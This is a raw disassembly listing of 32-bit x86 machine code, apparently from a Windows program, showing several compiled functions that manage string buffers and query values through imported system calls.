  403649:	84 c0                	test   %al,%al
  40364b:	0f 84 82 00 00 00    	je     0x4036d3
  403651:	8b 7d e8             	mov    -0x18(%ebp),%edi
  403654:	39 7d ec             	cmp    %edi,-0x14(%ebp)
  403657:	74 3d                	je     0x403696
  403659:	88 07                	mov    %al,(%edi)
  40365b:	8d 4f 04             	lea    0x4(%edi),%ecx
  40365e:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  403664:	89 bd 50 ff ff ff    	mov    %edi,-0xb0(%ebp)
  40366a:	50                   	push   %eax
  40366b:	e8 b0 fb ff ff       	call   0x403220
  403670:	8d 45 84             	lea    -0x7c(%ebp),%eax
  403673:	c6 45 fc 03          	movb   $0x3,-0x4(%ebp)
  403677:	50                   	push   %eax
  403678:	8d 4f 1c             	lea    0x1c(%edi),%ecx
  40367b:	e8 a0 fb ff ff       	call   0x403220
  403680:	8d 45 9c             	lea    -0x64(%ebp),%eax
  403683:	c6 45 fc 04          	movb   $0x4,-0x4(%ebp)
  403687:	50                   	push   %eax
  403688:	8d 4f 34             	lea    0x34(%edi),%ecx
  40368b:	e8 90 fb ff ff       	call   0x403220
  403690:	83 45 e8 4c          	addl   $0x4c,-0x18(%ebp)
  403694:	eb 3d                	jmp    0x4036d3
  403696:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
  40369c:	50                   	push   %eax
  40369d:	57                   	push   %edi
  40369e:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4036a1:	e8 2a 0f 00 00       	call   0x4045d0
  4036a6:	eb 2b                	jmp    0x4036d3
  4036a8:	68 20 6e 42 00       	push   $0x426e20
  4036ad:	6a 0a                	push   $0xa
  4036af:	6a 01                	push   $0x1
  4036b1:	51                   	push   %ecx
  4036b2:	33 c9                	xor    %ecx,%ecx
  4036b4:	e8 77 4e 00 00       	call   0x408530
  4036b9:	83 c4 04             	add    $0x4,%esp
  4036bc:	50                   	push   %eax
  4036bd:	e8 ae 4f 00 00       	call   0x408670
  4036c2:	83 c4 10             	add    $0x10,%esp
  4036c5:	c6 85 68 ff ff ff 00 	movb   $0x0,-0x98(%ebp)
  4036cc:	c6 85 63 ff ff ff 01 	movb   $0x1,-0x9d(%ebp)
  4036d3:	53                   	push   %ebx
  4036d4:	ff 15 8c 10 42 00    	call   *0x42108c
  4036da:	8d 8d 68 ff ff ff    	lea    -0x98(%ebp),%ecx
  4036e0:	e8 3b 01 00 00       	call   0x403820
  4036e5:	c6 45 fc 00          	movb   $0x0,-0x4(%ebp)
  4036e9:	8b c6                	mov    %esi,%eax
  4036eb:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4036ee:	2b ce                	sub    %esi,%ecx
  4036f0:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4036f6:	72 14                	jb     0x40370c
  4036f8:	8b 76 fc             	mov    -0x4(%esi),%esi
  4036fb:	83 c1 23             	add    $0x23,%ecx
  4036fe:	2b c6                	sub    %esi,%eax
  403700:	83 c0 fc             	add    $0xfffffffc,%eax
  403703:	83 f8 1f             	cmp    $0x1f,%eax
  403706:	0f 87 0e 01 00 00    	ja     0x40381a
  40370c:	51                   	push   %ecx
  40370d:	56                   	push   %esi
  40370e:	e8 f9 8a 00 00       	call   0x40c20c
  403713:	8b 3d f4 11 42 00    	mov    0x4211f4,%edi
  403719:	8b 9d 58 ff ff ff    	mov    -0xa8(%ebp),%ebx
  40371f:	83 c4 08             	add    $0x8,%esp
  403722:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  403729:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  403730:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  403737:	8b 85 5c ff ff ff    	mov    -0xa4(%ebp),%eax
  40373d:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  403740:	51                   	push   %ecx
  403741:	40                   	inc    %eax
  403742:	c7 45 bc 1c 00 00 00 	movl   $0x1c,-0x44(%ebp)
  403749:	50                   	push   %eax
  40374a:	68 40 13 42 00       	push   $0x421340
  40374f:	0f 57 c0             	xorps  %xmm0,%xmm0
  403752:	89 85 5c ff ff ff    	mov    %eax,-0xa4(%ebp)
  403758:	6a 00                	push   $0x0
  40375a:	53                   	push   %ebx
  40375b:	66 0f 13 45 c0       	movlpd %xmm0,-0x40(%ebp)
  403760:	66 0f 13 45 c8       	movlpd %xmm0,-0x38(%ebp)
  403765:	66 0f 13 45 d0       	movlpd %xmm0,-0x30(%ebp)
  40376a:	ff 15 00 12 42 00    	call   *0x421200
  403770:	85 c0                	test   %eax,%eax
  403772:	0f 85 78 fd ff ff    	jne    0x4034f0
  403778:	8b b5 54 ff ff ff    	mov    -0xac(%ebp),%esi
  40377e:	53                   	push   %ebx
  40377f:	ff 15 f8 11 42 00    	call   *0x4211f8
  403785:	80 bd 63 ff ff ff 00 	cmpb   $0x0,-0x9d(%ebp)
  40378c:	74 40                	je     0x4037ce
  40378e:	0f 57 c0             	xorps  %xmm0,%xmm0
  403791:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  403798:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40379b:	66 0f d6 45 d8       	movq   %xmm0,-0x28(%ebp)
  4037a0:	e8 cb 05 00 00       	call   0x403d70
  4037a5:	c6 45 fc 05          	movb   $0x5,-0x4(%ebp)
  4037a9:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4037ac:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4037af:	3b c1                	cmp    %ecx,%eax
  4037b1:	74 13                	je     0x4037c6
  4037b3:	ff b5 50 ff ff ff    	push   -0xb0(%ebp)
  4037b9:	51                   	push   %ecx
  4037ba:	50                   	push   %eax
  4037bb:	ff 75 e8             	push   -0x18(%ebp)
  4037be:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4037c1:	e8 3a 11 00 00       	call   0x404900
  4037c6:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4037c9:	e8 f2 0c 00 00       	call   0x4044c0
  4037ce:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4037d1:	89 06                	mov    %eax,(%esi)
  4037d3:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4037d6:	89 46 04             	mov    %eax,0x4(%esi)
  4037d9:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4037dc:	89 46 08             	mov    %eax,0x8(%esi)
  4037df:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4037e2:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  4037e9:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  4037f0:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  4037f7:	e8 c4 0c 00 00       	call   0x4044c0
  4037fc:	8b c6                	mov    %esi,%eax
  4037fe:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403801:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403808:	59                   	pop    %ecx
  403809:	5f                   	pop    %edi
  40380a:	5e                   	pop    %esi
  40380b:	5b                   	pop    %ebx
  40380c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40380f:	33 cd                	xor    %ebp,%ecx
  403811:	e8 e5 89 00 00       	call   0x40c1fb
  403816:	8b e5                	mov    %ebp,%esp
  403818:	5d                   	pop    %ebp
  403819:	c3                   	ret
  40381a:	e8 7a c9 00 00       	call   0x410199
  40381f:	cc                   	int3
  403820:	56                   	push   %esi
  403821:	8b f1                	mov    %ecx,%esi
  403823:	8b 4e 48             	mov    0x48(%esi),%ecx
  403826:	83 f9 08             	cmp    $0x8,%ecx
  403829:	72 32                	jb     0x40385d
  40382b:	8b 46 34             	mov    0x34(%esi),%eax
  40382e:	8d 0c 4d 02 00 00 00 	lea    0x2(,%ecx,2),%ecx
  403835:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40383b:	72 16                	jb     0x403853
  40383d:	8b 50 fc             	mov    -0x4(%eax),%edx
  403840:	83 c1 23             	add    $0x23,%ecx
  403843:	2b c2                	sub    %edx,%eax
  403845:	83 c0 fc             	add    $0xfffffffc,%eax
  403848:	83 f8 1f             	cmp    $0x1f,%eax
  40384b:	0f 87 b6 00 00 00    	ja     0x403907
  403851:	8b c2                	mov    %edx,%eax
  403853:	51                   	push   %ecx
  403854:	50                   	push   %eax
  403855:	e8 b2 89 00 00       	call   0x40c20c
  40385a:	83 c4 08             	add    $0x8,%esp
  40385d:	33 c0                	xor    %eax,%eax
  40385f:	c7 46 44 00 00 00 00 	movl   $0x0,0x44(%esi)
  403866:	c7 46 48 07 00 00 00 	movl   $0x7,0x48(%esi)
  40386d:	66 89 46 34          	mov    %ax,0x34(%esi)
  403871:	8b 4e 30             	mov    0x30(%esi),%ecx
  403874:	83 f9 08             	cmp    $0x8,%ecx
  403877:	72 2e                	jb     0x4038a7
  403879:	8b 46 1c             	mov    0x1c(%esi),%eax
  40387c:	8d 0c 4d 02 00 00 00 	lea    0x2(,%ecx,2),%ecx
  403883:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  403889:	72 12                	jb     0x40389d
  40388b:	8b 50 fc             	mov    -0x4(%eax),%edx
  40388e:	83 c1 23             	add    $0x23,%ecx
  403891:	2b c2                	sub    %edx,%eax
  403893:	83 c0 fc             	add    $0xfffffffc,%eax
  403896:	83 f8 1f             	cmp    $0x1f,%eax
  403899:	77 6c                	ja     0x403907
  40389b:	8b c2                	mov    %edx,%eax
  40389d:	51                   	push   %ecx
  40389e:	50                   	push   %eax
  40389f:	e8 68 89 00 00       	call   0x40c20c
  4038a4:	83 c4 08             	add    $0x8,%esp
  4038a7:	33 c0                	xor    %eax,%eax
  4038a9:	c7 46 2c 00 00 00 00 	movl   $0x0,0x2c(%esi)
  4038b0:	c7 46 30 07 00 00 00 	movl   $0x7,0x30(%esi)
  4038b7:	66 89 46 1c          	mov    %ax,0x1c(%esi)
  4038bb:	8b 4e 18             	mov    0x18(%esi),%ecx
  4038be:	83 f9 08             	cmp    $0x8,%ecx
  4038c1:	72 2e                	jb     0x4038f1
  4038c3:	8b 46 04             	mov    0x4(%esi),%eax
  4038c6:	8d 0c 4d 02 00 00 00 	lea    0x2(,%ecx,2),%ecx
  4038cd:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4038d3:	72 12                	jb     0x4038e7
  4038d5:	8b 50 fc             	mov    -0x4(%eax),%edx
  4038d8:	83 c1 23             	add    $0x23,%ecx
  4038db:	2b c2                	sub    %edx,%eax
  4038dd:	83 c0 fc             	add    $0xfffffffc,%eax
  4038e0:	83 f8 1f             	cmp    $0x1f,%eax
  4038e3:	77 22                	ja     0x403907
  4038e5:	8b c2                	mov    %edx,%eax
  4038e7:	51                   	push   %ecx
  4038e8:	50                   	push   %eax
  4038e9:	e8 1e 89 00 00       	call   0x40c20c
  4038ee:	83 c4 08             	add    $0x8,%esp
  4038f1:	c7 46 14 00 00 00 00 	movl   $0x0,0x14(%esi)
  4038f8:	33 c0                	xor    %eax,%eax
  4038fa:	c7 46 18 07 00 00 00 	movl   $0x7,0x18(%esi)
  403901:	66 89 46 04          	mov    %ax,0x4(%esi)
  403905:	5e                   	pop    %esi
  403906:	c3                   	ret
  403907:	e8 8d c8 00 00       	call   0x410199
  40390c:	cc                   	int3
  40390d:	cc                   	int3
  40390e:	cc                   	int3
  40390f:	cc                   	int3
  403910:	53                   	push   %ebx
  403911:	8b dc                	mov    %esp,%ebx
  403913:	83 ec 08             	sub    $0x8,%esp
  403916:	83 e4 f8             	and    $0xfffffff8,%esp
  403919:	83 c4 04             	add    $0x4,%esp
  40391c:	55                   	push   %ebp
  40391d:	8b 6b 04             	mov    0x4(%ebx),%ebp
  403920:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  403924:	8b ec                	mov    %esp,%ebp
  403926:	6a ff                	push   $0xffffffff
  403928:	68 9b 05 42 00       	push   $0x42059b
  40392d:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403933:	50                   	push   %eax
  403934:	53                   	push   %ebx
  403935:	81 ec 78 08 00 00    	sub    $0x878,%esp
  40393b:	a1 0c b0 42 00       	mov    0x42b00c,%eax
  403940:	33 c5                	xor    %ebp,%eax
  403942:	89 45 ec             	mov    %eax,-0x14(%ebp)
  403945:	56                   	push   %esi
  403946:	57                   	push   %edi
  403947:	50                   	push   %eax
  403948:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40394b:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403951:	8b fa                	mov    %edx,%edi
  403953:	8b f1                	mov    %ecx,%esi
  403955:	89 b5 7c f7 ff ff    	mov    %esi,-0x884(%ebp)
  40395b:	89 b5 7c f7 ff ff    	mov    %esi,-0x884(%ebp)
  403961:	33 c0                	xor    %eax,%eax
  403963:	c7 85 ac f7 ff ff 00 	movl   $0x0,-0x854(%ebp)
  40396a:	00 00 00 
  40396d:	c7 85 b0 f7 ff ff 07 	movl   $0x7,-0x850(%ebp)
  403974:	00 00 00 
  403977:	66 89 85 9c f7 ff ff 	mov    %ax,-0x864(%ebp)
  40397e:	89 85 c4 f7 ff ff    	mov    %eax,-0x83c(%ebp)
  403984:	c7 85 c8 f7 ff ff 07 	movl   $0x7,-0x838(%ebp)
  40398b:	00 00 00 
  40398e:	66 89 85 b4 f7 ff ff 	mov    %ax,-0x84c(%ebp)
  403995:	89 85 dc f7 ff ff    	mov    %eax,-0x824(%ebp)
  40399b:	c7 85 e0 f7 ff ff 07 	movl   $0x7,-0x820(%ebp)
  4039a2:	00 00 00 
  4039a5:	66 89 85 cc f7 ff ff 	mov    %ax,-0x834(%ebp)
  4039ac:	50                   	push   %eax
  4039ad:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4039b0:	88 85 98 f7 ff ff    	mov    %al,-0x868(%ebp)
  4039b6:	89 85 84 f7 ff ff    	mov    %eax,-0x87c(%ebp)
  4039bc:	8d 85 80 f7 ff ff    	lea    -0x880(%ebp),%eax
  4039c2:	50                   	push   %eax
  4039c3:	6a 04                	push   $0x4
  4039c5:	8d 85 94 f7 ff ff    	lea    -0x86c(%ebp),%eax
  4039cb:	50                   	push   %eax
  4039cc:	6a 04                	push   $0x4
  4039ce:	8d 85 84 f7 ff ff    	lea    -0x87c(%ebp),%eax
  4039d4:	50                   	push   %eax
  4039d5:	68 40 40 29 00       	push   $0x294040
  4039da:	57                   	push   %edi
  4039db:	ff 15 94 10 42 00    	call   *0x421094
  4039e1:	85 c0                	test   %eax,%eax
  4039e3:	75 0a                	jne    0x4039ef
  4039e5:	68 88 6e 42 00       	push   $0x426e88
  4039ea:	e9 03 02 00 00       	jmp    0x403bf2
  4039ef:	33 c0                	xor    %eax,%eax
  4039f1:	c7 85 8c f7 ff ff 04 	movl   $0x4,-0x874(%ebp)
  4039f8:	00 00 00 
  4039fb:	66 89 85 e8 f7 ff ff 	mov    %ax,-0x818(%ebp)
  403a02:	8b 85 94 f7 ff ff    	mov    -0x86c(%ebp),%eax
  403a08:	6a 00                	push   $0x0
  403a0a:	89 85 88 f7 ff ff    	mov    %eax,-0x878(%ebp)
  403a10:	8d 85 7c f7 ff ff    	lea    -0x884(%ebp),%eax
  403a16:	50                   	push   %eax
  403a17:	68 fe 07 00 00       	push   $0x7fe
  403a1c:	8d 85 e8 f7 ff ff    	lea    -0x818(%ebp),%eax
  403a22:	c7 85 90 f7 ff ff 00 	movl   $0x0,-0x870(%ebp)
  403a29:	00 00 00 
  403a2c:	50                   	push   %eax
  403a2d:	6a 0c                	push   $0xc
  403a2f:	8d 85 88 f7 ff ff    	lea    -0x878(%ebp),%eax
  403a35:	50                   	push   %eax
  403a36:	68 44 40 29 00       	push   $0x294044
  403a3b:	57                   	push   %edi
  403a3c:	ff 15 94 10 42 00    	call   *0x421094
  403a42:	85 c0                	test   %eax,%eax
  403a44:	0f 84 a3 01 00 00    	je     0x403bed
  403a4a:	8b 85 7c f7 ff ff    	mov    -0x884(%ebp),%eax
  403a50:	d1 e8                	shr    $1,%eax
  403a52:	33 c9                	xor    %ecx,%ecx
  403a54:	66 89 8c 45 ea f7 ff 	mov    %cx,-0x816(%ebp,%eax,2)
  403a5b:	ff 
  403a5c:	8d 8d e8 f7 ff ff    	lea    -0x818(%ebp),%ecx
  403a62:	8d 51 02             	lea    0x2(%ecx),%edx
  403a65:	66 8b 01             	mov    (%ecx),%ax
  403a68:	83 c1 02             	add    $0x2,%ecx
  403a6b:	66 85 c0             	test   %ax,%ax
  403a6e:	75 f5                	jne    0x403a65
  403a70:	2b ca                	sub    %edx,%ecx
  403a72:	8d 85 e8 f7 ff ff    	lea    -0x818(%ebp),%eax
  403a78:	d1 f9                	sar    $1,%ecx
  403a7a:	51                   	push   %ecx
  403a7b:	50                   	push   %eax
  403a7c:	8d 8d b4 f7 ff ff    	lea    -0x84c(%ebp),%ecx
  403a82:	e8 99 d8 ff ff       	call   0x401320
  403a87:	33 c0                	xor    %eax,%eax
  403a89:	c7 85 8c f7 ff ff 06 	movl   $0x6,-0x874(%ebp)
  403a90:	00 00 00 
  403a93:	66 89 85 e8 f7 ff ff 	mov    %ax,-0x818(%ebp)
  403a9a:	8b 85 94 f7 ff ff    	mov    -0x86c(%ebp),%eax
  403aa0:	6a 00                	push   $0x0
  403aa2:	89 85 88 f7 ff ff    	mov    %eax,-0x878(%ebp)
  403aa8:	8d 85 7c f7 ff ff    	lea    -0x884(%ebp),%eax
  403aae:	50                   	push   %eax
  403aaf:	68 fe 07 00 00       	push   $0x7fe
  403ab4:	8d 85 e8 f7 ff ff    	lea    -0x818(%ebp),%eax
  403aba:	c7 85 90 f7 ff ff 00 	movl   $0x0,-0x870(%ebp)
  403ac1:	00 00 00 
  403ac4:	50                   	push   %eax
  403ac5:	6a 0c                	push   $0xc
  403ac7:	8d 85 88 f7 ff ff    	lea    -0x878(%ebp),%eax
  403acd:	50                   	push   %eax
  403ace:	68 44 40 29 00       	push   $0x294044
  403ad3:	57                   	push   %edi
  403ad4:	ff 15 94 10 42 00    	call   *0x421094
  403ada:	85 c0                	test   %eax,%eax
  403adc:	0f 84 04 01 00 00    	je     0x403be6
  403ae2:	8b 85 7c f7 ff ff    	mov    -0x884(%ebp),%eax
  403ae8:	d1 e8                	shr    $1,%eax
  403aea:	33 c9                	xor    %ecx,%ecx
  403aec:	66 89 8c 45 ea f7 ff 	mov    %cx,-0x816(%ebp,%eax,2)
  403af3:	ff 
  403af4:	8d 8d e8 f7 ff ff    	lea    -0x818(%ebp),%ecx
  403afa:	8d 51 02             	lea    0x2(%ecx),%edx
  403afd:	0f 1f 00             	nopl   (%eax)
  403b00:	66 8b 01             	mov    (%ecx),%ax
  403b03:	83 c1 02             	add    $0x2,%ecx
  403b06:	66 85 c0             	test   %ax,%ax
  403b09:	75 f5                	jne    0x403b00
  403b0b:	2b ca                	sub    %edx,%ecx
  403b0d:	8d 85 e8 f7 ff ff    	lea    -0x818(%ebp),%eax
  403b13:	d1 f9                	sar    $1,%ecx
  403b15:	51                   	push   %ecx
  403b16:	50                   	push   %eax
  403b17:	8d 8d 9c f7 ff ff    	lea    -0x864(%ebp),%ecx
  403b1d:	e8 fe d7 ff ff       	call   0x401320
  403b22:	33 c0                	xor    %eax,%eax
  403b24:	c7 85 8c f7 ff ff 08 	movl   $0x8,-0x874(%ebp)
  403b2b:	00 00 00 
  403b2e:	66 89 85 e8 f7 ff ff 	mov    %ax,-0x818(%ebp)
  403b35:	8b 85 94 f7 ff ff    	mov    -0x86c(%ebp),%eax
  403b3b:	6a 00                	push   $0x0
  403b3d:	89 85 88 f7 ff ff    	mov    %eax,-0x878(%ebp)
  403b43:	8d 85 7c f7 ff ff    	lea    -0x884(%ebp),%eax
  403b49:	50                   	push   %eax
  403b4a:	68 fe 07 00 00       	push   $0x7fe
  403b4f:	8d 85 e8 f7 ff ff    	lea    -0x818(%ebp),%eax
  403b55:	c7 85 90 f7 ff ff 00 	movl   $0x0,-0x870(%ebp)
  403b5c:	00 00 00 
  403b5f:	50                   	push   %eax
  403b60:	6a 0c                	push   $0xc
  403b62:	8d 85 88 f7 ff ff    	lea    -0x878(%ebp),%eax
  403b68:	50                   	push   %eax
  403b69:	68 44 40 29 00       	push   $0x294044
  403b6e:	57                   	push   %edi
  403b6f:	ff 15 94 10 42 00    	call   *0x421094
  403b75:	85 c0                	test   %eax,%eax
  403b77:	74 49                	je     0x403bc2
  403b79:	8b 85 7c f7 ff ff    	mov    -0x884(%ebp),%eax
  403b7f:	d1 e8                	shr    $1,%eax
  403b81:	33 c9                	xor    %ecx,%ecx
  403b83:	66 89 8c 45 ea f7 ff 	mov    %cx,-0x816(%ebp,%eax,2)
  403b8a:	ff 
  403b8b:	8d 8d e8 f7 ff ff    	lea    -0x818(%ebp),%ecx
  403b91:	8d 51 02             	lea    0x2(%ecx),%edx
  403b94:	66 8b 01             	mov    (%ecx),%ax
  403b97:	83 c1 02             	add    $0x2,%ecx
  403b9a:	66 85 c0             	test   %ax,%ax
  403b9d:	75 f5                	jne    0x403b94
  403b9f:	2b ca                	sub    %edx,%ecx
  403ba1:	8d 85 e8 f7 ff ff    	lea    -0x818(%ebp),%eax
  403ba7:	d1 f9                	sar    $1,%ecx
  403ba9:	51                   	push   %ecx
  403baa:	50                   	push   %eax
  403bab:	8d 8d cc f7 ff ff    	lea    -0x834(%ebp),%ecx
  403bb1:	e8 6a d7 ff ff       	call   0x401320
  403bb6:	c6 85 98 f7 ff ff 01 	movb   $0x1,-0x868(%ebp)
  403bbd:	c6 06 01             	movb   $0x1,(%esi)
  403bc0:	eb 4b                	jmp    0x403c0d
  403bc2:	68 68 6f 42 00       	push   $0x426f68
  403bc7:	6a 0a                	push   $0xa
  403bc9:	6a 01                	push   $0x1
  403bcb:	51                   	push   %ecx
  403bcc:	33 c9                	xor    %ecx,%ecx
  403bce:	e8 5d 49 00 00       	call   0x408530
  403bd3:	83 c4 04             	add    $0x4,%esp
  403bd6:	50                   	push   %eax
  403bd7:	e8 94 4a 00 00       	call   0x408670
  403bdc:	8a 85 98 f7 ff ff    	mov    -0x868(%ebp),%al
  403be2:	88 06                	mov    %al,(%esi)
  403be4:	eb 24                	jmp    0x403c0a
  403be6:	68 18 6f 42 00       	push   $0x426f18
  403beb:	eb da                	jmp    0x403bc7
  403bed:	68 d8 6e 42 00       	push   $0x426ed8
  403bf2:	6a 0a                	push   $0xa
  403bf4:	6a 01                	push   $0x1
  403bf6:	51                   	push   %ecx
  403bf7:	33 c9                	xor    %ecx,%ecx
  403bf9:	e8 32 49 00 00       	call   0x408530
  403bfe:	83 c4 04             	add    $0x4,%esp
  403c01:	50                   	push   %eax
  403c02:	e8 69 4a 00 00       	call   0x408670
  403c07:	c6 06 00             	movb   $0x0,(%esi)
  403c0a:	83 c4 10             	add    $0x10,%esp
  403c0d:	0f 10 85 9c f7 ff ff 	movups -0x864(%ebp),%xmm0
  403c14:	c7 46 14 00 00 00 00 	movl   $0x0,0x14(%esi)
  403c1b:	8d 8d 98 f7 ff ff    	lea    -0x868(%ebp),%ecx
  403c21:	c7 46 18 00 00 00 00 	movl   $0x0,0x18(%esi)
  403c28:	33 c0                	xor    %eax,%eax
  403c2a:	0f 11 46 04          	movups %xmm0,0x4(%esi)
  403c2e:	66 89 85 9c f7 ff ff 	mov    %ax,-0x864(%ebp)
  403c35:	f3 0f 7e 85 ac f7 ff 	movq   -0x854(%ebp),%xmm0
  403c3c:	ff 
  403c3d:	66 0f d6 46 14       	movq   %xmm0,0x14(%esi)
  403c42:	0f 10 85 b4 f7 ff ff 	movups -0x84c(%ebp),%xmm0
  403c49:	66 89 85 b4 f7 ff ff 	mov    %ax,-0x84c(%ebp)
  403c50:	89 85 ac f7 ff ff    	mov    %eax,-0x854(%ebp)
  403c56:	0f 11 46 1c          	movups %xmm0,0x1c(%esi)
  403c5a:	c7 85 b0 f7 ff ff 07 	movl   $0x7,-0x850(%ebp)
  403c61:	00 00 00 
  403c64:	f3 0f 7e 85 c4 f7 ff 	movq   -0x83c(%ebp),%xmm0
  403c6b:	ff 
  403c6c:	66 0f d6 46 2c       	movq   %xmm0,0x2c(%esi)
  403c71:	0f 10 85 cc f7 ff ff 	movups -0x834(%ebp),%xmm0
  403c78:	89 85 c4 f7 ff ff    	mov    %eax,-0x83c(%ebp)
  403c7e:	c7 85 c8 f7 ff ff 07 	movl   $0x7,-0x838(%ebp)
  403c85:	00 00 00 
  403c88:	0f 11 46 34          	movups %xmm0,0x34(%esi)
  403c8c:	66 89 85 cc f7 ff ff 	mov    %ax,-0x834(%ebp)
  403c93:	f3 0f 7e 85 dc f7 ff 	movq   -0x824(%ebp),%xmm0
  403c9a:	ff 
  403c9b:	89 85 dc f7 ff ff    	mov    %eax,-0x824(%ebp)
  403ca1:	66 0f d6 46 44       	movq   %xmm0,0x44(%esi)
  403ca6:	c7 85 e0 f7 ff ff 07 	movl   $0x7,-0x820(%ebp)
  403cad:	00 00 00 
  403cb0:	e8 6b fb ff ff       	call   0x403820
  403cb5:	8b c6                	mov    %esi,%eax
  403cb7:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403cba:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403cc1:	59                   	pop    %ecx
  403cc2:	5f                   	pop    %edi
  403cc3:	5e                   	pop    %esi
  403cc4:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  403cc7:	33 cd                	xor    %ebp,%ecx
  403cc9:	e8 2d 85 00 00       	call   0x40c1fb
  403cce:	8b e5                	mov    %ebp,%esp
  403cd0:	5d                   	pop    %ebp
  403cd1:	8b e3                	mov    %ebx,%esp
  403cd3:	5b                   	pop    %ebx
  403cd4:	c3                   	ret
  403cd5:	cc                   	int3
  403cd6:	cc                   	int3
  403cd7:	cc                   	int3
  403cd8:	cc                   	int3
  403cd9:	cc                   	int3
  403cda:	cc                   	int3
  403cdb:	cc                   	int3
  403cdc:	cc                   	int3
  403cdd:	cc                   	int3
  403cde:	cc                   	int3
  403cdf:	cc                   	int3
  403ce0:	55                   	push   %ebp
  403ce1:	8b ec                	mov    %esp,%ebp
  403ce3:	8b 55 08             	mov    0x8(%ebp),%edx
  403ce6:	8a 02                	mov    (%edx),%al
  403ce8:	88 01                	mov    %al,(%ecx)
  403cea:	33 c0                	xor    %eax,%eax
  403cec:	c7 41 14 00 00 00 00 	movl   $0x0,0x14(%ecx)
  403cf3:	c7 41 18 00 00 00 00 	movl   $0x0,0x18(%ecx)
  403cfa:	0f 10 42 04          	movups 0x4(%edx),%xmm0
  403cfe:	0f 11 41 04          	movups %xmm0,0x4(%ecx)
  403d02:	f3 0f 7e 42 14       	movq   0x14(%edx),%xmm0
  403d07:	66 0f d6 41 14       	movq   %xmm0,0x14(%ecx)
  403d0c:	c7 42 14 00 00 00 00 	movl   $0x0,0x14(%edx)
  403d13:	c7 42 18 07 00 00 00 	movl   $0x7,0x18(%edx)
  403d1a:	66 89 42 04          	mov    %ax,0x4(%edx)
  403d1e:	89 41 2c             	mov    %eax,0x2c(%ecx)
  403d21:	89 41 30             	mov    %eax,0x30(%ecx)
  403d24:	0f 10 42 1c          	movups 0x1c(%edx),%xmm0
  403d28:	0f 11 41 1c          	movups %xmm0,0x1c(%ecx)
  403d2c:	f3 0f 7e 42 2c       	movq   0x2c(%edx),%xmm0
  403d31:	66 0f d6 41 2c       	movq   %xmm0,0x2c(%ecx)
  403d36:	89 42 2c             	mov    %eax,0x2c(%edx)
  403d39:	c7 42 30 07 00 00 00 	movl   $0x7,0x30(%edx)
  403d40:	66 89 42 1c          	mov    %ax,0x1c(%edx)
  403d44:	89 41 44             	mov    %eax,0x44(%ecx)
  403d47:	89 41 48             	mov    %eax,0x48(%ecx)
  403d4a:	0f 10 42 34          	movups 0x34(%edx),%xmm0
  403d4e:	0f 11 41 34          	movups %xmm0,0x34(%ecx)
  403d52:	f3 0f 7e 42 44       	movq   0x44(%edx),%xmm0
  403d57:	66 0f d6 41 44       	movq   %xmm0,0x44(%ecx)
  403d5c:	89 42 44             	mov    %eax,0x44(%edx)
  403d5f:	c7 42 48 07 00 00 00 	movl   $0x7,0x48(%edx)
  403d66:	66 89 42 34          	mov    %ax,0x34(%edx)
  403d6a:	8b c1                	mov    %ecx,%eax
  403d6c:	5d                   	pop    %ebp
  403d6d:	c2 04 00             	ret    $0x4
  403d70:	53                   	push   %ebx
  403d71:	8b dc                	mov    %esp,%ebx
  403d73:	83 ec 08             	sub    $0x8,%esp
  403d76:	83 e4 f8             	and    $0xfffffff8,%esp
  403d79:	83 c4 04             	add    $0x4,%esp
  403d7c:	55                   	push   %ebp
  403d7d:	8b 6b 04             	mov    0x4(%ebx),%ebp
  403d80:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  403d84:	8b ec                	mov    %esp,%ebp
  403d86:	6a ff                	push   $0xffffffff
  403d88:	68 0d 06 42 00       	push   $0x42060d
  403d8d:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403d93:	50                   	push   %eax
  403d94:	53                   	push   %ebx
  403d95:	81 ec a0 08 00 00    	sub    $0x8a0,%esp
  403d9b:	a1 0c b0 42 00       	mov    0x42b00c,%eax
  403da0:	33 c5                	xor    %ebp,%eax
  403da2:	89 45 ec             	mov    %eax,-0x14(%ebp)
  403da5:	56                   	push   %esi
  403da6:	57                   	push   %edi
  403da7:	50                   	push   %eax
  403da8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403dab:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403db1:	8b f1                	mov    %ecx,%esi
  403db3:	89 b5 60 f7 ff ff    	mov    %esi,-0x8a0(%ebp)
  403db9:	89 b5 64 f7 ff ff    	mov    %esi,-0x89c(%ebp)
